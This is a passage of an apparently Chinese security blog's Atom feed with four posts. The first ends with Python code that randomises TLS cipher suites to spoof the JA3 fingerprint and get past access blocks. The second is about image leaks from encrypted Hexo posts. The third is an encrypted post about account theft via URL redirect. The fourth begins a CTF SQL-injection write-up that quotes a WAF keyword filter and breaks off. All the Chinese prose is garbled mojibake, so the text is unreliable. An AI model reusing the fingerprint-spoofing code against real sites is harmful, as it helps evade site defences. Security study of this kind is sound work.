function_">init_poolmanager</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        context = create_urllib3_context(ssl_version=<span class="number">2</span>,ciphers=self.CIPHERS)</span><br><span class="line">        kwargs[<span class="string">&#x27;ssl_context&#x27;</span>] = context</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>(DESAdapter, self).init_poolmanager(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># def proxy_manager_for(self, *args, **kwargs):</span></span><br><span class="line">    <span class="comment">#     context = create_urllib3_context(ssl_version=2,ciphers=self.CIPHERS)</span></span><br><span class="line">    <span class="comment">#     kwargs[&#x27;ssl_context&#x27;] = context</span></span><br><span class="line">    <span class="comment">#     super(DESAdapter, self).proxy_manager_for(*args, **kwargs)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SpoofJa3Get</span>(<span class="params">url,headers</span>):</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    s.headers.update(headers)</span><br><span class="line">    s.mount(url, DESAdapter())</span><br><span class="line">    resp = s.get(url)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    resp = SpoofJa3Get(<span class="string">&#x27;https://kawayiyi.com/tls&#x27;</span>,&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Edg/92.0.902.67&#x27;</span>&#125;)</span><br><span class="line">    data = resp.json()</span><br><span class="line">    <span class="built_in">print</span>(data[<span class="string">&#x27;tlsHashMd5&#x27;</span>])</span><br></pre></td></tr></table></figure></p><p>è¿™ä¸ªæ˜¯è¿è¡Œæ•ˆæœï¼Œå¯ä»¥çœ‹åˆ°ja3æŒ‡çº¹ç¡®å®éƒ½æ”¹å˜äº†<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/15.jpg" alt></p><p>æ¥ä¸‹æ¥ç®€å•è®²è§£ä¸€ä¸‹ä»£ç <br>è¿™é‡Œä¸»è¦æ˜¯å»ç»§æ‰¿åŸå…ˆçš„HTTPAdapterï¼Œåœ¨æ„é€ å‡½æ•°ä¸­å°†Cipher Suitesè¿›è¡Œæ‰“ä¹±éšæœºæ’åºï¼Œç„¶åå»é‡å†™<code>init_poolmanager</code><br>å¯ä»¥çœ‹åˆ°å®˜æ–¹æ–‡æ¡£ä»‹ç»è¿™ä¸ªå‡½æ•°</p><blockquote><p>Initializes a urllib3 PoolManager.<br>&nbsp;&nbsp;&nbsp;This method should not be called<br>&nbsp;&nbsp;&nbsp;from user code, and is only exposed for use when subclassing the<br>&nbsp;&nbsp;&nbsp;:class:`HTTPAdapter <requests.adapters.HTTPAdapter>`.<br>&nbsp;&nbsp;&nbsp;:param connections: The number of urllib3 connection pools to cache.<br>&nbsp;&nbsp;&nbsp;:param maxsize: The maximum number of connections to save in the pool.<br>&nbsp;&nbsp;&nbsp;:param block: Block when no free connections are available.</requests.adapters.HTTPAdapter></p></blockquote><p>åªæœ‰çŸ­çŸ­çš„ä¸€å¥ï¼Œæ ¹æ®åç§°çŒœæµ‹å°±æ˜¯åˆå§‹åŒ–ä¸€ä¸ªè¿æ¥æ± ä¹‹ç±»çš„ï¼Œç„¶åæ¯æ¬¡è®¿é—®åˆ«çš„ç½‘ç«™éƒ½è¦åŸºäºè¿™ä¸ªè¿æ¥æ± å»è®¿é—®ï¼Œç±»ä¼¼ä¸urllib3çš„PoolManager</p><p>create_urllib3_context å®˜æ–¹æ–‡æ¡£ä»‹ç»æˆ‘å°±ä¸è´´å‡ºæ¥äº†ï¼Œå…·ä½“å¯ä»¥çœ‹<br><a href="https://github.com/urllib3/urllib3/blob/main/src/urllib3/util/ssl_.py#L221">https://github.com/urllib3/urllib3/blob/main/src/urllib3/util/ssl_.py#L221</a><br>ç®€å•è¯´ä¸€ä¸‹å°±æ˜¯åˆ›å»ºå¹¶ä¸”é…ç½®ä¸€ä¸ªsslå†…å®¹çš„å®ä¾‹ï¼Œå¹¶ä¸”è¿”å›è¿™ä¸ªå®ä¾‹ï¼Œä½†æ˜¯ç»™å‡ºçš„å‚æ•°ä¸ja3æŒ‡çº¹ç›¸å…³çš„åªæœ‰</p><ul><li>ssl version</li><li>cipher suites</li></ul><p>sslç‰ˆæœ¬æˆ‘ä»¬ä¸èƒ½éšä¾¿ä¿®æ”¹ï¼Œä¸ç„¶å°±ä¼šå‡ºé”™ï¼Œèƒ½ä¿®æ”¹çš„åªæœ‰æ”¯æŒçš„åŠ å¯†ç®—æ³•<br>åé¢çš„ä»£ç æˆ‘å°±ä¸åšè¿‡å¤šè§£é‡Šäº†ï¼Œåº”è¯¥éƒ½æ˜¯å¾ˆç®€å•çš„</p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>è‡³äºæ€ä¹ˆå»ä¿®æ”¹Extensions Type,Supported Groups,Elliptic curves point formatsæ¥è¿›è¡Œä¿®æ”¹ja3æŒ‡çº¹ï¼Œæˆ‘å°±ä¸å¤ªæ¸…æ¥šäº†<br>ä¹‹å‰åœ¨stackoverflowä¸Šé¢é—®äº†ä¸€ä¸ªè·Ÿæˆ‘æœ‰åŒæ ·ç–‘æƒ‘çš„ç½‘å‹ï¼Œé—®ä»–ç°åœ¨è§£å†³æ²¡æœ‰ï¼Œä½†æ˜¯è¯„è®ºä¸çŸ¥é“ä¸ºä»€ä¹ˆè¢«ç³»ç»Ÿç§’åˆ äº†ï¼Œæˆ‘ä¹Ÿå°±æ²¡å»è¿›è¡Œæ·±ç©¶äº†<br><a href="https://stackoverflow.com/questions/69982651/tls-adapter-for-extentions-with-python3-requests/74032540#74032540">https://stackoverflow.com/questions/69982651/tls-adapter-for-extentions-with-python3-requests/74032540#74032540</a></p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li><a href="https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967/">https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967/</a></li><li><a href="https://www.cnblogs.com/theseventhson/p/14613527.html">https://www.cnblogs.com/theseventhson/p/14613527.html</a></li><li><a href="https://stackoverflow.com/questions/40373115/how-to-select-specific-the-cipher-while-sending-request-via-python-request-modul">https://stackoverflow.com/questions/40373115/how-to-select-specific-the-cipher-while-sending-request-via-python-request-modul</a></li><li><a href="https://urllib3.readthedocs.io/en/stable/reference/urllib3.poolmanager.html">https://urllib3.readthedocs.io/en/stable/reference/urllib3.poolmanager.html</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å†™åœ¨å‰é¢&quot;&gt;&lt;a href=&quot;#å†™åœ¨å‰é¢&quot; class=&quot;headerlink&quot; title=&quot;å†™åœ¨å‰é¢&quot;&gt;&lt;/a&gt;å†™åœ¨å‰é¢&lt;/h2&gt;&lt;p&gt;å› ä¸ºåœ¨t00lsä¸Šçœ‹åˆ°æœ‰äººæé—®ï¼Œä»£ç†äº†ipä¹Ÿæ— æ³•çªç ´é™åˆ¶è®¿é—®&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="çˆ¬è™«" scheme="http://example.com/categories/%E7%88%AC%E8%99%AB/"/>
    
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
    <category term="çˆ¬è™«" scheme="http://example.com/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>hexo æ•æ„Ÿæ–‡ä»¶æ³„æ¼</title>
    <link href="http://example.com/2022/10/21/hexo-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/"/>
    <id>http://example.com/2022/10/21/hexo-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/</id>
    <published>2022-10-21T09:36:12.000Z</published>
    <updated>2022-10-21T10:03:19.624Z</updated>
    
    <content type="html"><![CDATA[<h2 id="èµ·å› "><a href="#èµ·å› " class="headerlink" title="èµ·å› "></a>èµ·å› </h2><p>åœ¨å‘ä¸Šä¸€ç¯‡æ–‡ç« çš„æ—¶å€™ï¼Œå› ä¸ºæ¶‰åŠåˆ°æ•æ„Ÿä¿¡æ¯æ‰€ä»¥è£…äº†ä¸ªæ’ä»¶<br><code>npm install --save hexo-blog-encrypt</code><br><span id="more"></span><br>ç»™æˆ‘çš„åšæ–‡è¿›è¡Œäº†åŠ å¯†è®¿é—®<br>ä»Šå¤©å¿ƒè¡€æ¥æ½®ï¼Œå»æˆ‘çš„githubä»“åº“çœ‹äº†ä¸€çœ¼<br><img src="/2022/10/21/hexo-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/1.jpg" alt><br>å¥½å®¶ä¼™ï¼Œå‘ç°å›¾ç‰‡å…¨åœ¨é‡Œé¢ï¼Œä¹Ÿå°±ä»£è¡¨ç€åˆ«äººåªè¦ç¿»ä¸€ä¸‹æˆ‘çš„ä»“åº“å°±èƒ½çŸ¥é“åˆ°åº•æ˜¯å“ªä¸ªç½‘ç«™å­˜åœ¨é‚£ä¸ªæ¼æ´äº†</p><h2 id="çœ‹çœ‹åˆ«äººå­˜ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜"><a href="#çœ‹çœ‹åˆ«äººå­˜ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜" class="headerlink" title="çœ‹çœ‹åˆ«äººå­˜ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜"></a>çœ‹çœ‹åˆ«äººå­˜ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜</h2><p>è¿™æ—¶å€™æˆ‘å°±æƒ³åˆ°y4å¤§ä½¬çš„åšå®¢ä¹Ÿæœ‰ä¸€äº›åŠ å¯†æ–‡ç« <br>æˆ‘å°±å»ç¿»äº†ä¸€ä¸‹<br><img src="/2022/10/21/hexo-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/2.jpg" alt><br><img src="/2022/10/21/hexo-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/4.jpg" alt><br><img src="/2022/10/21/hexo-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/3.jpg" alt><br>çœ‹æ¥å¤§éƒ¨åˆ†äººéƒ½åº”è¯¥æ²¡æœ‰æ„è¯†åˆ°è¿™ä¸ªé—®é¢˜ï¼Œéƒ½æ˜¯åŠ å¯†äº†æ–‡ç« ï¼Œä½†æ˜¯å›¾ç‰‡è¿˜æ˜¯ä¸Šä¼ äº†ä¸Šå»<br>è™½ç„¶æ³„æ¼çš„å¹¶ä¸å¤šï¼Œä¹Ÿå°±åªæœ‰å›¾ç‰‡ï¼Œä½†ä¹Ÿç®—ä¸€ä¸ªå°æ¼æ´å§</p><h2 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h2><p>å› ä¸ºä¸æƒ³èŠ±é’±å»ä¹°æœåŠ¡å™¨ï¼Œæ‰€ä»¥æœ€åæˆ‘å°±æŠŠå›¾ç‰‡é“¾æ¥å…¨éƒ¨æ”¹ä¸ºå›¾åºŠçš„é“¾æ¥ï¼Œåº”è¯¥å°±èƒ½è§£å†³è¿™ä¸ªé—®é¢˜äº†ï¼Œç„¶åæŠŠä¹‹å‰çš„å›¾ç‰‡å…¨éƒ¨åˆ é™¤æ‰</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;èµ·å› &quot;&gt;&lt;a href=&quot;#èµ·å› &quot; class=&quot;headerlink&quot; title=&quot;èµ·å› &quot;&gt;&lt;/a&gt;èµ·å› &lt;/h2&gt;&lt;p&gt;åœ¨å‘ä¸Šä¸€ç¯‡æ–‡ç« çš„æ—¶å€™ï¼Œå› ä¸ºæ¶‰åŠåˆ°æ•æ„Ÿä¿¡æ¯æ‰€ä»¥è£…äº†ä¸ªæ’ä»¶&lt;br&gt;&lt;code&gt;npm install --save hexo-blog-encrypt&lt;/code&gt;&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ä¿¡æ¯æ³„æ¼" scheme="http://example.com/categories/%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/"/>
    
    
    <category term="æ¸—é€æµ‹è¯•" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="å®æˆ˜" scheme="http://example.com/tags/%E5%AE%9E%E6%88%98/"/>
    
    <category term="ä¿¡æ¯æ³„éœ²" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>å®æˆ˜|çœ‹æˆ‘å¦‚ä½•ä»urlè·³è½¬åˆ°ç›—å·</title>
    <link href="http://example.com/2022/10/13/%E7%9C%8B%E6%88%91%E5%A6%82%E4%BD%95%E4%BB%8Eurl%E8%B7%B3%E8%BD%AC%E5%88%B0%E7%9B%97%E5%8F%B7/"/>
    <id>http://example.com/2022/10/13/%E7%9C%8B%E6%88%91%E5%A6%82%E4%BD%95%E4%BB%8Eurl%E8%B7%B3%E8%BD%AC%E5%88%B0%E7%9B%97%E5%8F%B7/</id>
    <published>2022-10-13T04:06:02.000Z</published>
    <updated>2022-10-21T09:24:55.965Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="å¯†ç é”™è¯¯" data-whm="åŠ å¯†æ— æ³•éªŒè¯">  <script id="hbeData" type="hbeData" data-hmacdigest="0812e8fe096560142d950d298e99d24f600648f50a342a34b549c556f208099a">997c39fd209fc88ff14214af16a192b2c0d0a378e6a90d93e73b2a42d40bfff4be8925ff6cbb5176939d617643ddb4eccd51b320fa7070a3843da66ec6f0d5ff6b375ad4b05f7b3bf3f08f32bd574fa98244a214e278385c1237bbe73ebab60d30e3a37a83fbc0081c646090ecaa8193244b6e0fe95eddcf06eee433df1200e0f23c10140e3decb0b32f2b20005ec00a1ab7f1a7f9226fc3d6347b7870688749106b6983aab071879d92212bf688d3869b4d539971165a6b4e0648db4fb279f8de764d3d397a74cd983a2e62f5dd0391b72790489b6caed499cd805080614cfd85ffcf5cd247118ec9539959e4741a56d1f5356b1b861f058b3d1af2378fbc865275c81fd71af946a2185ca1143e197e52797cdba7cecbe8b2bfbdc18c537b9dbb2bed061af84a1f214d35a6b0c700caa26f9de04638daac3bc531966aec421977619cf3c3499c417dd4a1904babb36a4ebdb94c31b7c606257b993a2a1b1496c009f6ac4e6218e59480b046f17998806134618bc6aeede34a3b8f3cef00572a8385ed70c4be159534de4af6a6ab52e8bd8b350a08e18a5feb82d2b6e70ef0c101aeb4a3cc0917d5c1e0354fef4a5ae53aa864a5d86ceeea8c396f886e5be8cac0cdbc93cf2ad5624bd89a432aa5135264c24247e90339ad847816ca2fead97251d421f61a92e1e4ac662a54c4caa8c90393c564a1febc92185e1a9762d69d4a639296dcb92ca73ae9be10f5d99203f44a022b527a81f77ffb1a2ee215b420e57e895c236634323d9c736332a06a78d18bd52204a0ee8f5809b306d07feb0cde1ab6bb962e95a821d736f02c4e131167fa1b8830c349c7cbbb6824d1105cda5a8bd8ddc3fa527d15da793fea863fcfa11eeeced15f4728d3cfa2740f420c6f5720fd75dbc2565f011fea6a1f73c9623c9ccddd32ba3f74f9d8eff9372da68a305123448e4f7ec7e429ae61879cc2421bbec59171c3d8d7e2acb621921050cb1398a4f05c5cb2d46de6964946fd6c52beb9d81f291ac928ed5b6811224d574050ad7e248a49cf6b7627c7cd5f93d7aa0c8e222d33ac2277aafbefc21a0a1ac4a34c45cfdfe27ef88b9d49327b64a87c06f979a130ff6675df7139699500b409ba119e5a7357f76a3a8ba573e8d3ff2e9bb649a07e39c9589faf0ef559e13dd22e6ddbff63e45e3a19796888aa83cc425271f5676e1f0522948ceb3236dd09b0a84d517273c6b3f3de2f81433a7ae617d1797da52b777ba992ed3fe5dda6967813c830ca819f3a90a011846fc288044d4e44906e21be650c1f2ef49b932a4abfb7b41b935e6a8433f63846c65b6a145fe9b5676cf53f617b88414409116010cba308f385f06234f2eb53efde051c478dba672373f72f31e1677121a1ec6407574342fb88b18de92b79ae8b23e3b7f6bdbf78d5f9c1181282fa8cf46345060b33f97af4142256d3be239b996afa6fa12651f0089eacf17d0560381cdb88a644d184e4e1e30548f7d5d572c871ac9c0ff15bdbbdb0a4c7fcdb19c575ab7601e561c3d8cbe6006ec54efa67bd4927ae99be2d3d460eecb16574add8240b2c139f0ae1990aa621faa66c38852621025fef1ad7e700e8ac1c6cac6cc8c0751b2a14f02365558fd9a71a7a5026b1e76cff71c34d7609d84c9a669415f027520418880743c6c6a9def0d2f440fef49565eaca72c8198fb55515fd48fe28c4213630b6e95b1c9c749db56478b7d183ecd6293b78f9b86ef3fcc89f9df13155fa3596bb73f0ed01a6868c6c507bab921fc661cc889f21045383ae5686c9120fd46bbae3b0bbaca0cd41796485fc828e2f5d8d1cbccb15b3a0423a8c742f4c4b4a23b35b55c6cc7eac5f241efe6ab81f330f46a6204daaa537326a48d580d9d4922a2c975c4670afe91de833bd031d374e333c9fe18ac8be3fc2415bdb463a405c9d80007ac41970a4a7bbb52e80a937d16ea463af5d752d5a9e27f0cb51b6428626d87822d952425ce287b2c6fd59908ed942fc7b0adc3151fa7823c7eef63016f8e3b827e256ca86230d6b7294902a4663ade2624dd0b4fd6277565b9a13965980e36a2d905b9255a042e278e11a05c304b56608f94b1b4f31c3468859ae5c86ea7a5d73ac2a6e97dbfe0d3b2c2c5a1cda69f1314fb34d01b9473ed85b30bddf24ddd411b00d2d8b267bf994ff50d52f8458024842a754f330dbb15f16de31b550e032ebff48f652715139ca30d6b4d6951031bab676a7db05f4ec986cd03d99a483b7627df0a0620231e10d95922d31dfdfc78e8ea46adcfcb87625653e79dc2867cc71f193f3d3446813a8b624aaf5dc975d45afa38f7512d9be1542eef02af7c9fcca98ce66aa32708cfde38c1b2c36ca9ab3d6bd91806678300f455c3adb29b76c9af3469e11412d8b49825e97e37fd9b39a9d8857dd7cffdaf3b4a137b20792255488f79ccb426a61c73daed5986b2deeec79f88e588d17a90b20caf19e656a9977496b2532896f7b4e4472af584ee46f942bd287091047f70a50a9d333febc92cde30a26dc2e65f5b5dc37a9313bb6a4e772ca6e7ae815fdb4d5489ba72be612523c7bc1c40bce119fc701f0caa8b0912f1e1882ec204e0ba3391f29320eec8068379f0338e98fc07dbbd304cdf4cc9bef050c2effcdbf2179f952b066a20ae25abd6c486d115bb452ec97a519ebacc0b222ab170b850b52505e185001b3baef58dee7db561da3755f3dce8d1bee98d275f44166a5ef1235ec9de2a0e8bcdb5ea8637b96dfc43864e7a9de28b68797c6eb7a6904a1c4075e8a229fc0411cd3dc143addfbd31f67577603df9c3d95385149d1571720bf58de3a3a51dcb7d063d37ae512d634f4d33fedf5136964680996b71d81fba334b9370c06b2d8d22c09b402dcca91120c3d96fd27aeef455e99480f52e58ddfe4581b41f254cd2a999ab120539b2b30226c350e437234983ca32c4c863156d21875b4c5bcecee6cfbf85570395d730c42ba7f08211008e5222db00d13b40e7898682870197063ce56b32b7fe1f0d89eecbce4db0eb2893b60120187c22370eb5afc487799ca162be9ea329ef42e12e171139c8f7a0dacac519f9031a178bc311186650e34818504df5fe0e749cd78fff122b7241e1aa0f5dfc46331cc64a22506d55782a6dd71f4ef38beee79a66f31c7b1b74c342307787a13d58e378992503595eabf6e4f224126b39582889d1bc1485be239e77a783d474a843f0b977626a4335f453fc0452e4af9ff838c1270f00f41729ebfec712178fe911ccb7faedd98e45cfa2fbade323b91447de5fb0988d4e60eeb1864f27c80bbaab5dd1043bb5ed317a7339de69088a297519c92a8dc6a798246be4556ee117de0080995f641bca8b79913207c73efa612d97111bc093aeed38f6147c70bc89559e2867db3dd9d4c14931137b5c46beba21b6a002b219e897351f9804ca7c08942f44818d7e47d49c5c7e9f5b4d331fd36424c13ae213375faf3ad56c701e15d74bc8eadb3727803defeb957cd46605f653cb21671b3ee8cac1ef336d0ae7d21e2e267f419766d532a4d3bd06c86fe6920c1258bc8f862185b2481ac78ff10555bd0881cb23fb5d347ba7d2cae080ba0a68facd9645996b2da04d1ff108634f2ce31a60f8c6173c4ef531200909327e91054da4b1ec3583b79f3a0af03c41497de78d6064957ed161a8ad03d84a15b7f350532bf8a0aeb883391b540ffc06ddc51876c84c5ab6df8aa2c51c01d7e91d46ba1310973802c73e987756305bb62fabb920007ac3811217edb757719929a2e856506713c1384fe392ce0587b15d73823234e55ecd67f1f05a741a11d03004f750666cc6bc0db4593c20a6306d63695c2312766ba8fda0cddb3ba724b7e0005b643d1c1b4d7f863251279cac90f2728c8608bd7f5dfdfc3e0cab3dabe084525edcf8dd3f6605f596a614bcbc447e38b80983b734a328d65e0c7901d2e8fe6e02f842a426d12d2b2d7a6454d87efb86b98d3b7872f533967641015292488a70a59c61039518ea88560f7eee1cfddf5a3e7f927164430a480ef1a78dab4f81b8f9cd93644d6acd96c7985a15543741f62aefbdee1b3632534de0d27531edb22602da31c354b6765b65619a0f934e68a05940e5bfe614fc666417fbccbee7b223419447ac7725907e9839ddd03cb304bf7e660cd63eca1d8d5015094beafdf9c92ac6909df7aa8a9c3e84061c814009170ae8d9a4d49aadaaa0226229613865226a2b91e751dae760b0135c7b5b93315f4067c2ebddedc19d2e6de70028da68dd0b481b12e9d189a2ddd630285ec096b443ab237ec0af70b7deb8bf98ff6965664f9daec57336d5c3d2411e8f1f7458ee6a3eda809bdff220e2aaa7b988183d2e7a5cba3c5801a758637a7fcf83fc39fdd0e3e62d6b2e8d1214e071e85d6f4a46913b963cfa13726fe505b20e8e2e899c2662810d086dc677f70d59443c725a60cefffcdfd0071d3842e67090faaa5986d6e058932fbb825ce14ba967184ac875c72fc1930ae10482bb000452458c0e8b7f4bf51906c215beea156b6e5766c2243a706d2de356c202ff3be3746944d83f728f1d2377c176b337cc1795bcfe1ac15a5233a905883ed1890192bfbe4f9ca0b09db75e4e80167a52a8a9f32eefd7ce70b719ef50f59ae355cfaa36f39e13fd0a70da6578f46e2d9ec203fb61c8137352047fe7c0c529b4e05614839b80add277404812986ca05b3ea5fd934d6b5ec11e2d9dbb91c97020505fa891e3ce63740ad2358114b24a2eb04e113ee2316a931d7c8d0c54e588e992c10eafe1e0cc181df84b1a92d3bcd5cbc8f2875a1a5f4be9794daffb673271e4ceaab69994071e97197fed3de4034a8c4d48e222450e5fd3a346ee76fc7b3c2cc87fde7a7934d2b6ffb7ed584158d2c02e2f5c84a86beccb1acef693a7dcee283c1781c1f43a6547d6013b93fd152477f7c80ccc9d2532c1a63092760b972a523c450eea4b19b71375d17f9f8bed94438c9e2fa640ce08231d18eeed0eae58fc823c4a58205740fa5b0cca40a17bfe9589e0f879e97a751528fe3d73c83b81ef9faadc63aae3a4948d945c139f90b40701826410a18cbed75ab7d7bf382273386c78a823bd01c53f757f7d4837c658e85b540db1ef937e57429c1e3e5473ba7a552733ae84846342ca3f67a023d3b3f11f3c416c8600a26b48322dc65be46b807f2a1e43730d2fa7bf63a6c2d5721adca143ab3445d1a9c7182b71b525c6ca1ae1054253997e6e25fe1da96ccea9d4bb08767e0751f56430a8a76ff3fae2a9d51f4198a93aa4d4f6e175f3baa96545e866517a21e0877dc5f452fdc3a7f6b5525556f71a94d407c71e222f34bc5899fa6fca29865f910d999f62aebee17a9b959940afd794465b1ebc5d65da3f3b41576d6b7b3c58cc1f1227fd2c47358f65ca1088f12620d36a8c49a09edcb2ab77f973115f5b71409886b8944a393408382e36a2666a85a3d44f2a97ee53afb5519a92302c6f9bb40208e47ab497266b299c245b2d10bd844a024639e88cb5aa3b78b58dddd494d943150b0c9098d5f09e5d117d310de65e13a0ca2ec5d5a0331152ffad4247671880be7a1b28558a7c17af559f74cfe80864e27628d0b6bf0006b75d45314f92690ffff3d0aeecbfddf82384844c12be71020bb724f007aa1ac8330213211aa62b99472dd0db1672ca9b8737ca60c911f49d1e61c02f7c1f9eab939eb7a6e884961b33d7a5da0936aac65a38716d3a235e7483e175ea2125c0f94628dc771a401c90361ddaa3570c392639fcab54b1566bef13ade296b911900fd8e663108660f0bc55081b59715a337df3103489e1d15c9c173105a65089870d4478dbc580cb1c4be8f6f76f71a6a62e7b9cb34e9463015836517d6f3018d1acbc798ab35848b92776d1ff6db23fdb374e189b5551ba95707e8bb6c4f23cbc7b83679413e872b2ee0dee120dc29121cbe23bccb6876cb8b3df36b48b5c630599f4d81366430fb06e313273d7e0cf85e5fec603215095f3ac60436fe84385d1d90bf2d687f00e33c77d7fc6aa65ae0c76595e0f3860a1c0255e0487cf9adfc1b2fb877cf464f0a457f090d6743d8e2b8a0a895c0200bf05a8e1a98773485916ff146d211ffb73491dfea3ebc079adce20669715e000c8e14b7473d299ca5b0859f70040ca6a17107ae903bbc07f314819a0011b2c30c72c6066f2ffd0854f863b865553bb7c8b56d7f7cef8edaa8800c86ba4c5057ed9b3d22aea5653c74d573c93fff5d49cf881293d639607fc7902eb2df59d235a0f5dcc4baa6f1efc1318dfb233763675e25cf16315129d410a9d82e3be6fae76b4775d3a917ecfbc21c6b4a31fac70a77822538abe5bd448b4f10579068663eedbca63d386b697a7e1b2c5a208ad158645602571c55697ed18634a1bc5ad5e8ed879d56013c57afd0b7b8b7e3eca5dab90c1bbf2555b5530ca12aec90a80b97ce7fc3218ca4f150b77553199589c7a4785b1d4fa3df738a7a076c56bfb82be80ff73ed00ed9bb20137b7c83d10a5c3e23b39dbac3a339a10016ae048df5fb58d680471597d209c3c0940696cd294c911f4af8b4b5e8f027dbdbbc6742a67543ead33da4ff6fba85b73a8c08f77d1de9b4e28450bb251b4d4f287c1c0dd8886ab610bff395aa08</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">å¯†ç </span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">è¾“å…¥å¯†ç é˜…è¯»</summary>
    
    
    
    <category term="æ¸—é€æµ‹è¯•" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="æ¸—é€æµ‹è¯•" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="å®æˆ˜" scheme="http://example.com/tags/%E5%AE%9E%E6%88%98/"/>
    
    <category term="é€»è¾‘æ¼æ´" scheme="http://example.com/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>å›½èµ›åˆèµ›sqlæ³¨å…¥</title>
    <link href="http://example.com/2022/09/28/%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9Bsql%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2022/09/28/%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9Bsql%E6%B3%A8%E5%85%A5/</id>
    <published>2022-09-28T05:16:27.000Z</published>
    <updated>2022-09-28T07:38:26.505Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-å‰è¨€"><a href="#1-å‰è¨€" class="headerlink" title="1.å‰è¨€"></a>1.å‰è¨€</h2><p>æœ€è¿‘åœ¨ç–¯ç‹‚æ¶è¡¥sqlæ³¨å…¥çš„çŸ¥è¯†ï¼Œäº†è§£åˆ°å›½èµ›åˆèµ›æœ‰ä¸€é“sqlæ³¨å…¥çš„é¢˜ç›®ï¼Œå°±å»çœ‹äº†ä¸€ä¸‹<br><span id="more"></span></p><h2 id="2-åˆ†æè¿‡æ»¤"><a href="#2-åˆ†æè¿‡æ»¤" class="headerlink" title="2.åˆ†æè¿‡æ»¤"></a>2.åˆ†æè¿‡æ»¤</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s,()#;*~\-]/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/^.*(?=union|binary|regexp|rlike).*$/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$r</span>);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">string</span>)<span class="variable">$r</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯wafä»£ç 